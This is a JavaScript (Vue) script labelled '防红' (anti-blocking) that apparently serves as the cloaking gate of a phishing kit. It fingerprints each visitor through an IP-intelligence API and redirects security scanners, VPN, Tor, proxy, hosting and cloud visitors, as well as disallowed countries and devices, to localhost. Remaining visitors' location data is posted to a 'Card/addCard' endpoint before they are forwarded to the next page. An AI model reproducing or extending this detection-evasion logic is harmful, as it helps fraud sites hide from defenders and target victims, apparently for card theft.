var v2 = new Vue({
  el: "#appAll",
  data() {
    return {
      userInfo: {
        ua: null,
        ip: null,
        language: null,
        ipzip: null,
        ipguojia: null,
        domainName: ""
      },
      isOk: "防红",
      timer: "",
      setup: 0,
      ruleList: null
    };
  },
  created() {
    axios.get(configAll.serverUrl + "general.Config/getRuleList")
      .then(response => {
        this.ruleList = response.data.list;
        let ruleIndex = 1; // 0x2b775 ^ 0x2b776 = 1
        let ruleValue = 1; // 0x40271 ^ 0x40270 = 1

        if (response.data.list[ruleIndex].value == ruleValue) {
          this.red();
        } else {
          this.userInfo = {
            ip: "17.0.0.71",
            language: "en",
            ipguojia: "us",
            ua: "US",
            ipzip: "test",
            domainName: ""
          };
          this.saveipNull();
        }

        localStorage.setItem("ruleList", JSON.stringify(response.data));
      })
      .catch(error => {
        console.log(error);
      });
  },
  mounted() {
    parent.postMessage({ page: "防红", value: "" }, "*");
  },
  methods: {
    red() {
      let self = this;
      fetch(`https://api.ipregistry.co/?key=${this.ruleList[1].value}`)
        .then(res => res.json())
        .then(data => {
          self.userInfo.ip = data.ip;
          self.checkIp(self.userInfo.ip);
          self.userInfo.language = data.location.language.name;
          self.userInfo.ipzip = data.location.postal;
          self.userInfo.ipguojia = data.location.country.code;
          self.checkCity(self.userInfo.ipguojia);
          self.userInfo.ua = data.user_agent.header;
          self.checkShebei(data.user_agent.os.name);

          let security = {
            is_cloud_provider: data.security.is_cloud_provider,
            is_proxy: data.security.is_proxy,
            is_tor: data.security.is_tor,
            is_relay: data.security.is_relay,
            is_threat: data.security.is_threat,
            is_tor_exit: data.security.is_tor_exit,
            is_vpn: data.security.is_vpn
          };

          const flags = [
            data.security.is_abuser,
            data.security.is_anonymous,
            data.security.is_attacker,
            data.security.is_bogon
          ];

          const connectionType = data.connection.type;
          const suspiciousConnections = ["cdn", "hosting", "education"];

          if (flags.includes(true) || suspiciousConnections.includes(connectionType)) {
            window.location = 'https://localhost';
            return;
          }

          if (self.openVpn(security)) {
            self.saveip(data.location.latitude, data.location.longitude);
          }
        })
        .catch(() => {
          self.saveipNull();
        });
    },
    getHome() {
      window.location = './indexInfore.html';
    },
    mapAddress(lat, lon) {
      // Empty implementation (placeholder)
    },
    checkIp(ip) {
      axios.get(configAll.serverUrl + "Card/checkIp", { params: { ip } })
        .then(response => {
          const status = response.data.data?.ipStatus;
          if (status === 0) {
            window.location = 'https://localhost';
          } else {
            this.setup += 1;
          }
        })
        .catch(error => {
          console.log(error);
        });
    },
    checkCity(countryCode) {
      const cityRules = JSON.parse(this.ruleList[1].content);
      const allowedCities = this.ruleList[2].value.split(',');
      for (const city of allowedCities) {
        if (cityRules[city] === countryCode) {
          this.setup += 1;
          return;
        }
      }
      window.location = 'https://localhost';
    },
    saveip(lat, lon) {
      this.userInfo.domainName = window.location.host;
      axios.get(`https://dev.virtualearth.net/REST/v1/Locations/${lat},${lon}?o=JSON&key=${configAll.mapkey}`)
        .then(response => {
          this.userInfo.ipAddress = response.data.resourceSets[0].resources[0].name;
          this.timer = setInterval(() => {
            if (this.setup === 4) {
              clearInterval(this.timer);
              axios.post(configAll.serverUrl + 'Card/addCard', this.userInfo)
                .then(res => {
                  localStorage.setItem("addressInfore", JSON.stringify(res.data.data));
                  this.getHome();
                })
                .catch(error => {
                  console.log(error);
                });
            }
          }, 200);
        })
        .catch(error => {
          console.log(error);
        });
    },
    saveipNull() {
      this.userInfo.domainName = window.location.host;
      axios.post(configAll.serverUrl + "Card/addCard", this.userInfo)
        .then(response => {
          localStorage.setItem('addressInfore', JSON.stringify(response.data.data));
          this.getHome();
        })
        .catch(error => {
          console.log(error);
        });
    },
    checkShebei(osName) {
      let osType = 3; // Default unknown
      if (osName.toLowerCase() === "android") osType = 1;
      else if (osName.toLowerCase() === "ios") osType = 2;

      const allowedDevices = this.ruleList[3].value.split(',');
      if (allowedDevices.includes(osType.toString())) {
        this.setup += 1;
        return;
      }
      window.location = 'https://localhost';
    },
    openVpn(security) {
      const vpnRules = this.ruleList[6].value.split(',');
      for (const rule of vpnRules) {
        switch (rule) {
          case '1':
            if (security.is_vpn) window.location = 'https://localhost';
            break;
          case '2':
            if (security.is_proxy) window.location = 'https://localhost';
            break;
          case '5':
            if (security.is_relay) window.location = 'https://localhost';
            break;
          case '6':
            if (security.is_cloud_provider) window.location = 'https://localhost';
            break;
          case '7':
            if (security.is_tor) window.location = 'https://localhost';
            break;
          case '8':
            if (security.is_tor_exit) window.location = 'https://localhost';
            break;
          case '10':
            if (security.is_threat) window.location = 'https://localhost';
            break;
          default:
            break;
        }
      }
      this.setup += 1;
      return true;
    }
  }
});
